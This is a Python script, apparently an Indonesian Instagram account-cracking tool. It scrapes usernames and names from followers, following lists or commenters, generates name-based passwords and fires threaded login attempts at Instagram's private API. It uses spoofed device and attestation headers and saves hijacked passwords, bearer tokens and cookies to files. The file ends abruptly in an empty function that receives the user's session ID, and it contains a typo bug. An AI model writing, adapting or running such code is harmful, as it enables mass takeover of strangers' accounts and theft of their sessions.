import os, requests, random, time, uuid, re, base64, json, sys, hashlib, datetime, pytz
from concurrent.futures import ThreadPoolExecutor
from J4useragent import GenerateUseragent

uid_user = []
dumpdata = []
lop, ok, cp = 0, 0, 0

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
R = "\x1b[0;31m" # Merah

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(
        """
╦┌┐┌┌─┐┌┬┐┌─┐
║│││└─┐ │ ├─┤
╩┘└┘└─┘ ┴ ┴ ┴
[@Ryota-XD]"""
    )


class instagram_api_config:
    config_login = {'mid': [], 'attp': []}
    def __init__(self, barcelona = False):
        self.bloks = 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306' if barcelona is True else 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd'
        self.version = '376.0.0.2.109' if barcelona is True else '365.0.0.52.192'
        self.versio_code = '719982544' if barcelona is True else '672535977'
        self.android_version = '28/9'
        self.dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
        self.pxl = '576x1024'

    def useragent(self):
        if os.path.isfile('random.txt') == False:
            self.devices = random.choice([
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; Vortex; HD65_Ultra; HD65_Ultra; mt6739; en_US; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; OPPO; PEPM00; OP4ECB; qcom; en_GB; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; TCL; 8496G; Gaia; mt6762; en_GB; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; INFINIX/Infinix; Infinix X6871; Infinix-X6871; mt6895; en_US; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; INFINIX MOBILITY LIMITED/Infinix; Infinix X690B; Infinix-X690B; mt6768; fr_FR; {self.versio.code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; realme; RMX3151; RE54B4L1; mt6781; es_ES; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; vivo; vivo 1802; 1802; mt6762; en_US; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; asus; ASUS_X01BDA; ASUS_X01BD_1; qcom; it_IT; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel};  samsung;  SM-G986U; y2q; qcom; en_US; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; Xiaomi/Redmi; M2101K7BNY; rosemary; mt6785; nl_NL; {self.versio_code})',
                f'Instagram {self.version} Android ({self.android_version}; {self.dpi_pixel}; HMD Global/Nokia; Nokia 2.4; WVR_sprout; mt6762; es_MX; {self.versio_code})'
            ])
            self.relang = re.findall(r'[a-zA-Z]{2}_[a-zA-Z]{2}', self.devices)
            self.agentUnik = self.devices.replace(self.relang[0],'in_ID')
            return self.agentUnik
        else:
            self.randomUa = open('random.txt','r').read().splitlines()
            for self.ufa in self.randomUa:
                self.app = re.findall('Instagram (.*)',self.ufa)
                if(self.app):
                    self.agentUnik = 'Instagram {}'.format(self.app[0])
                    return(self.agentUnik)


def pigeon():
    return f'UFS-{uuid.uuid4()}-0'

def clintime():
    return str(time.time())[:14]
    
def deviceid():
    return str(uuid.uuid4())
    
def family():
    return str(uuid.uuid4())

def androidid():
    return f'android-{str(uuid.uuid1().hex)[:16]}'
    
def idbear(cokie):
    try:
        id = re.search(r'ds_user_id=(\d+);',str(cokie)).group(1)
        sn = re.search(r'sessionid=(.*?);',str(cokie)).group(1)
        br = base64.b64encode(json.dumps({'ds_user_id': id, 'sessionid': sn}).encode()).decode()
        return id, br
    except AttributeError:
        sys.exit()

class RyotaXD:

    def __init__(self, cokz):
        self.cokie = cokz

    def apcb(self, username):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'viewport-width': '673'
                })
                awok = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
                return awok
            except:return None
    
    def media_id(self, posts_url):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'max-age=0', 'cookie':self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"', 
                    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.159", "Google Chrome";v="132.0.6834.159"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"6.8.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'viewport-width': '1105',

                })
                cccp = ses.get(posts_url).text
                ussr = re.search('{"media_id":"(.*?)"',str(cccp)).group(1)
                return ussr
            except AttributeError:return None

    def kyna(self,userid, next_pae, kynaa, apcb):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0', 'viewport-width': '673'
                })
                data = {"query_hash": apcb,"variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                myid = ses.get('https://www.instagram.com/graphql/query/',params=data).json()
                for ussr in myid['data']['user'][f'{kynaa}']['edges']:
                    cccp = ussr['node']['username']+'|'+ussr['node']['full_name'].replace('|','')
                    dumpdata.append(cccp)
                    print(f"\r+ mengambil ({H}{len(dumpdata)}{N}) username. (Ctrl+C untuk berhenti)", end="", flush=True)
                if(myid['data']['user'][f'{kynaa}']['page_info']['has_next_page']==True):
                    self.kyna(userid, myid['data']['user'][f'{kynaa}']['page_info']['end_cursor'], kynaa, apcb)
                else: return
            except:
                return

    def komentar(self, media_id, min_cursor):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'viewport-width': '1358',
                })
                ussr = ses.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                for usr in ussr['comments']:
                    dat = usr['user']['username'] +'|'+ usr['user']['full_name']
                    if dat not in dumpdata: dumpdata.append(dat)
                    print(f"\r+ mengambil ({H}{len(dumpdata)}{N}) username. (Ctrl+C untuk berhenti)", end="", flush=True)
                apc = ussr['next_min_id']
                self.komentar(media_id, apc)
            except: return

def kynaa():
    if os.path.isfile(".login.txt"):
        cokz = open(".login.txt", "r").read()
        ceks = cek_cookie(cokz)
        if ceks is False:
            try:os.remove(".login.txt")
            except:pass
            print("\n! cookie invalid");time.sleep(3);login()
        else:
            return cokz
    else:login()

def login():
    logo()
    cookie = input("\n> masukan cookie: ")
    try:
        cek_cookie(cookie)
        kyr_ulyxxn(re.search(r'sessionid=(.*?);',str(cookie)).group(1))
        open(".login.txt", "a").write(cookie)
    except Exception as e:
        sys.exit(f"Error: {e}")

def cek_cookie(cookie):
    if 'mid=' in str(cookie): mid = re.search('mid=(.*?);',str(cookie)).group(1)
    else: mid = ''
    with requests.Session() as ses:
        try:
            uid, ber = idbear(cookie)
            ses.headers.update({
                'x-ig-app-locale': 'in_ID', 'x-ig-device-locale': 'in_ID', 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-session-id': pigeon(), 'x-pigeon-rawclienttime': clintime(), 'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)), 'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)), 'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd', 'x-ig-www-claim': '0', 'x-debug-www-claim-source': 'handleLogin3', 'x-bloks-prism-button-version': 'CONTROL', 'x-bloks-prism-colors-enabled': 'false', 'x-bloks-prism-ax-base-colors-enabled': 'false', 'x-bloks-prism-font-enabled': 'false', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': deviceid(), 'x-ig-family-device-id': family(), 'x-ig-android-id': androidid(), 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::', 'x-fb-connection-type': 'WIFI', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTv10=', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'accept-language': 'id-ID, en-US', 'authorization': f'Bearer IGT:2:{ber}', 'x-mid': mid, 'ig-u-ds-user-id': uid, 'ig-intended-user-id': uid, 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True',
            })
            kyna = ses.get(f'https://i.instagram.com/api/v1/users/{uid}/info/').json()['user']
            print(
                f"""
     [ Info Account ]
[+] full name  : {kyna['full_name']}
[+] username   : {kyna['username']}
[+] followers  : {kyna['follower_count']}
[+] following  : {kyna['following_count']}"""
            )
            return True
        
        except ConnectionError:
            exit("\n! koneksi error")
        except:
            return False


def menu():
    os.system('clear')
    cokz = kynaa()
    print("""
[1] dump followers
[2] dump following
[3] dump komentar
[0] exit
""")
    fil = input("> ")
    if fil in ["1", "01"]:
        dump_followers(cokz)
    elif fil in ["2", "02"]:
        dump_following(cokz)
    elif fil in ["3", "03"]:
        dump_koomentar(cokz)
    elif fil in ["0", "00"]:
        print("✓ cookie berhasil dihapus")
        try:os.remove(".login.txt")
        except:pass
        sys.exit()
    else:
        print("! pilih yng bnr");time.sleep(1);menu()

def dump_followers(cokz):
    cccp = input("> masukan username: ").split(",")
    for ussr in cccp:
        uid = RyotaXD(cokz).apcb(ussr)
        if(uid): uid_user.append(uid)
    if len(uid_user) == 0:balik()
    for userid in uid_user:
        RyotaXD(cokz).kyna(userid, "", "edge_followed_by", "c76146de99bb02f6415203be841dd25a")

    if not dumpdata:
        balik()
    else:
        print("")
        print(f"✓ berhasil mengambil ({H}{len(dumpdata)}{N}) username.")
        kombinasi_pw()

def dump_following(cokz):
    cccp = input("> masukan username: ").split(",")
    for ussr in cccp:
        uid = RyotaXD(cokz).apcb(ussr)
        if(uid): uid_user.append(uid)
    if len(uid_user) == 0:balik()
    for userid in uid_user:
        RyotaXD(cokz).kyna(userid, "", "edge_follow", "d04b0a864b4b54837c0d870b0e77e076")

    if not dumpdata:
        balik()
    else:
        print("")
        print(f"✓ berhasil mengambil ({H}{len(dumpdata)}{N}) username.")
        kombinasi_pw()

def dump_koomentar(cokz):
    cccp = input("> masukan tautan: ")
    ussr = RyotaXD(cokz).media_id(cccp)
    if ussr == None: return menu()
    RyotaXD(cokz).komentar(ussr, '')

    if not dumpdata:
        balik()
    else:
        print("")
        print(f"✓ berhasil mengambil ({H}{len(dumpdata)}{N}) username.")
        kombinasi_pw()

def kombinasi_pw():
    print("\n> masukan pw tambahan\n> contoh: qwerty,123456")
    pw_tambahan = input("> password: ").split(",")
    instagram_attestation()
    with ThreadPoolExecutor(max_workers=30) as executor:
        for user in dumpdata:
            try:
                uid, nama = user.split('|')
                nama = nama.lower().strip()
            except ValueError:
                continue
            passwords = generate_passwords(nama, pw_tambahan)
            executor.submit(crack, uid, passwords)

    exit("\n> proses crack telah selesai")

def generate_passwords(nama, pw_tambahan):
    nama_split = nama.split(" ")
    nama_depan = nama_split[0] if len(nama_split) > 0 else ""
    nama_belakang = nama_split[1] if len(nama_split) > 1 else ""
    pasw = []
    
    if len(nama_depan) >= 3:
        pasw += [
            nama_depan + "123",
            nama_depan + "321",
            nama_depan + "12345",
            nama_depan + "12",
            nama_depan + "01",
            nama_depan + "02",
            nama_depan + "03",
            nama_depan + "04",
            nama_depan + "05",
            nama_depan + "06",
            nama_depan + "07",
            nama_depan + "08",
            nama_depan + "09",
            nama_depan + "0",
            nama_depan + "22",
            nama_depan + "24",
            nama_depan + nama_depan,
        ]
    
    if len(nama_belakang) >= 3:
        pasw += [
            nama_belakang + "123",
            nama_belakang + "321",
            nama_belakang + "12345",
            nama_belakang + "123456",
            nama_belakang + "cantik",
            nama_belakang + "12",
            nama_belakang + "22",
            nama_belakang + "01",
            nama_belakang + "02",
            nama_belakang + "03",
            nama_belakang + "04",
            nama_belakang + "05",
            nama_belakang + "06",
            nama_belakang + "07",
            nama_belakang + "08",
            nama_belakang + "09",
            nama_belakang + "0",
            nama_belakang + "22",
            nama_belakang + "24",
            nama_belakang + "25",
            nama_belakang + "26",
            nama_belakang + nama_belakang,
        ]

    if len(nama_depan) >= 3 and len(nama_belakang) >= 3:
        pasw += [
            nama_depan + nama_belakang,
            nama_belakang + nama_depan,
        ]
    
    pasw += pw_tambahan
    pasw = [p for p in set(pasw) if len(p) >= 6]
    return pasw[:15]

def Android_ID(users, passwd):
    xyz = hashlib.md5()
    xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
    hex = xyz.hexdigest()
    xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
    return xyz.hexdigest()

config_login = {'mid': [], 'attp': []}

def get_useragent(barcelona=False):
    version = '376.0.0.2.109' if barcelona else '375.0.0.43.47'
    versio_code = '719982544' if barcelona else '681635863'
    android_version = '34/14'
    dpi = '510dpi'
    pxl = '1080x2326'
    devices = random.choice([
        f'Instagram {version} Android ({android_version}; {dpi}; {pxl}; OPPO; PEPM00; OP4ECB; qcom; en_GB; {versio_code})',
        f'Instagram {version} Android ({android_version}; {dpi}; {pxl}; OPPO; MOBILITY LIMITED1; CPH2541; Snapdragon 9 Gen 3; id_ID; {versio_code})',
        f'Instagram {version} Android ({android_version}; {dpi}; {pxl}; Oppo; Oppo Find X6 Pro; CPH2523; Dimensity 9300; en_GB; {versio_code})',
        f'Instagram {version} Android ({android_version}; {dpi}; {pxl}; Vivo; Vivo X90 Pro; V2309A; Dimensity 9300; en_US; {versio_code})'
    ])
    relang = re.findall(r'[a-zA-Z]{2}_[a-zA-Z]{2}', devices)
    if relang:
        agentUnik = devices.replace(relang[0], 'in_ID')
    else:
        agentUnik = devices.replace('en_US', 'in_ID')
    return agentUnik

def timezone_offset():
    try:
        tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
        ofs = tim.utcoffset().total_seconds() / 3600
        return str(ofs)
    except:
        return str(-time.timezone / 3600)

def get_headers(barcelona=False):
    rawClient = str(int(time.time()))
    proxies=[{"http":"socks4://1.1.1.1:80"}]
    bloks = 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306' if barcelona else 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd'
    return {
        'x-ig-app-locale': 'in_ID',
        'x-ig-device-locale': 'in_ID',
        'x-ig-mapped-locale': 'id_ID',
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
        'x-pigeon-rawclienttime': f'{rawClient}.503',
        'x-ig-bandwidth-speed-kbps': '-1.000',
        'x-ig-bandwidth-totalbytes-b': '0',
        'x-ig-bandwidth-totaltime-ms': '0',
        'x-bloks-version-id': bloks,
        'x-ig-www-claim': '0',
        'x-bloks-prism-button-version': 'CONTROL',
        'x-bloks-prism-indigo-link-version': '0',
        'x-bloks-prism-colors-enabled': 'false',
        'x-bloks-prism-ax-base-colors-enabled': 'false',
        'x-bloks-prism-font-enabled': 'false',
        'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"%s","signed_nonce":"","key_hash":""}]}' % (random.choice(config_login['attp'])),
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': 'ec76c649-d663-48f1-b6bb-bcadc556d340',
        'x-ig-family-device-id': '293c83cd-45d8-4ea9-956d-357f7c476be4',
        'x-ig-android-id': 'android-bc2b6bd10fb8fbe6',
        'x-ig-timezone-offset': timezone_offset(),
        'x-ig-nav-chain': f'com.bloks.www.caa.login.home_template:com.bloks.www.caa.login.home_template:1:button:{rawClient}.356::',
        'x-ig-client-endpoint': 'com.bloks.www.caa.login.home_template',
        'x-fb-connection-type': 'WIFI',
        'x-ig-connection-type': 'WIFI',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-app-id': '3419628305025917' if barcelona else '567067343352427',
        'priority': 'u=3',
        'user-agent': str(get_useragent(barcelona).replace("Instagram", "Barcelona")) if barcelona else str(get_useragent(barcelona)),
        'accept-language': 'id-ID, en-US',
        'x-mid': random.choice(config_login['mid']),
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-encoding': 'gzip, deflate',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True',
    }

def instagram_attestation():
    for _ in range(2):
        try:
            tete = 'app_scoped_device_id={}&key_hash=a7061a8c87792ea1a16093d8561b50d164af65bb2649018fd5d730f6d938d89b'.format(str(uuid.uuid1()))
            head = {
                'priority': 'u=3',
                'user-agent': str(get_useragent()),
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306',
                'x-ig-www-claim': '0',
                'x-bloks-prism-button-version': 'CONTROL',
                'x-bloks-prism-indigo-link-version': '0',
                'x-ig-app-id': '3419628305025917',
                'x-bloks-prism-colors-enabled': 'false',
                'x-bloks-prism-ax-base-colors-enabled': 'false',
                'x-bloks-prism-font-enabled': 'false',
                'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': 'ec76c649-d663-48f1-b6bb-bcadc556d340',
                'x-ig-family-device-id': '293c83cd-45d8-4ea9-956d-357f7c476be4',
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
            }
            head.update({
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                'x-pigeon-rawclienttime': str(time.time())[:14],
                'x-ig-android-id': 'android-{}'.format(str(uuid.uuid4().hex)[:16]),
            })
            attp = requests.post('https://i.instagram.com/api/v1/attestation/create_android_keystore/', data=tete, headers=head)

            try:
                mecanizeid = attp.headers['ig-set-x-mid']
            except:
                mecanizeid = re.findall('mid=(.*?);', str(attp.headers))[0]
            changleNonce = attp.json()['challenge_nonce']
            config_login['mid'].append(mecanizeid)
            config_login['attp'].append(changleNonce)
        except Exception as e:
            print(e)
            continue

    if len(config_login['mid']) == 0:
        config_login['mid'].append('Z5ecVwABAAHhAlJcs_8MAFmJmejI')
    if len(config_login['attp']) == 0:
        config_login['attp'].append('AU9QtdGBOoj5Tsa6XmKzE03PI8rlxqec')
    print('\n+ proses crack instagram\n+ mainkan mode pesawat setiap 100 id\n')

def print_proses(code, lo, ok, cp):
    if code == 200:
        kyna = f"{H}200{N}"
    elif code == 400:
        kyna = f"{R}400{N}"
    elif code == 401:
        kyna = f"{R}401{N}"
    elif code == 403:
        kyna = f"{R}403{N}"
    elif code == 404:
        kyna = f"{R}404{N}"
    elif code == 429:
        kyna = f"{R}429{N}"
    elif code == 500:
        kyna = f"{R}500{N}"
    else:
        kyna = f"{R}{code}{N}"

    print(f"\r{H}•{N} [{kyna}] {str(lo)}/{len(dumpdata)} OK-:{H}{ok}{N} CP-:{R}{cp}{N}  ", end="")

def crack(user, pasw):
    global lop, ok, cp
    ses = requests.Session()
    for pw in pasw:
        try:
            smartCONFIG = {
                'android_id': 'android-{}'.format(Android_ID(user,pw)[:16]),
                'family': str(uuid.uuid4()),
                'device': str(uuid.uuid4()),
                'wartefall': str(uuid.uuid4()),
                'request_ts': str(time.time()),
                'ps': str(uuid.uuid4())
            }
            smartheaders = get_headers(False)
            smartheaders.update({
                'x-pigeon-rawclienttime': smartCONFIG['request_ts'][:14],
                'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
                'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
                'x-ig-device-id': smartCONFIG['device'],
                'x-ig-family-device-id': smartCONFIG['family'],
                'x-ig-android-id': smartCONFIG['android_id'],
                'user-agent': get_useragent()
            })
            SmartData = {
                'params': '{"client_input_params":{"device_id":"'+ smartCONFIG['android_id'] +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(user)+'","machine_id":"'+str(smartheaders['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(user)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                'bk_client_context': '{"bloks_version":"'+smartheaders['x-bloks-version-id']+'","styles_id":"instagram"}',
                'bloks_versioning_id': smartheaders['x-bloks-version-id']
            }
            ugen = GenerateUseragent().instagramuseragent()
            kyna = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=SmartData, headers=smartheaders)
            print_proses(kyna.status_code, lop, ok, cp)
            if 'logged_in_user' in str(kyna.text.replace('\\','')):
                try:
                    bearer = re.search('"Bearer IGT:2:(.*?)"', kyna.text.replace('\\','')).group(1)
                    cokies = 'mid=%s;'% smartheaders['x-mid'] + CookieBearer(bearer)
                    kontol = friends_user(cokies)
                    if 'memek' in str(kontol):kontol = friends_user_chek(user)
                except:
                    kontol = ("", "")
                    cokies = ""
                print(f"""\r{' ' * 76}
> Status      : {H}Succes Log in{N}
> Username    : {H}{user}{N}
> Password    : {H}{pw}{N}
> UserAgent   : {H}{ugen}{N}
> Followers   : {H}{kontol[0]}{N}
> Following   : {H}{kontol[1]}{N}
> Bearer      : {H}{bearer}{N}
> Cookiesss   : {H}{cokies}{N}
                """)
                result_data = f"{user}|{pw}|{kontol[0]}|{kontol[1]}|{cokies}"
                save_result(f"result/OK-{tggl()}.txt", result_data)
                ok +=1
                break
            elif 'https://i.instagram.com/challenge/' in str(kyna.text.replace('\\','')):
                kontol = friends_user_chek(user)
                print(f"""\r{' ' * 76}
> status    : {R}failed logged{N}
> username  : {K}{user}{N}
> password  : {K}{pw}{N}
> followers : {K}{kontol[0]}{N}
> following : {K}{kontol[1]}{N}
                """)
                result_data = f"{user}|{pw}|{kontol[0]}|{kontol[1]}"
                save_result(f"result/CP-{tggl()}.txt", result_data)
                cp +=1
                break
            elif 'redirect_login_challenges' in str(kyna.text.replace('\\','')):
                kontol = friends_user_chek(user)
                print('')
                print(
                    f"""\r{R}
\r> username  : {user}
\r> password  : {pw}
\r> followers : {kontol[0]}
\r> following : {kontol[1]}{N}
""")
                result_data = f"{user}|{pw}|{kontol[0]}|{kontol[1]}"
                save_result(f"result/CP-{tggl()}.txt", result_data)
                cp +=1
                break
        except (requests.exceptions.ConnectionError):
            time.sleep(30)
            crack(user, [pw])

    lop +=1


def create_folder():
    if not os.path.exists("result"):
        os.makedirs("result")

def save_result(file_name, data):
    with open(file_name, "a", encoding="utf-8") as file:
        file.write(data + "\n")

def friends_user(cookies):
    try:
        InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
        user = re.search(r'ds_user_id=(\d+)',str(cookies)).group(1)
        info = requests.get(f'https://i.instagram.com/api/v1/users/{user}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
        followers = info['follower_count']
        following = info['following_count']
        return followers, following
    except:
        return ('memek','memek')

def friends_user_chek(username):
    try:
        head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}
        head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
        req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=head).json()['data']['user']
        ikut,mengikut = req['edge_followed_by']['count'],req['edge_follow']['count']
        return(ikut,mengikut)
    except:return(None,None)

def kyr_ulyxxn(usr):
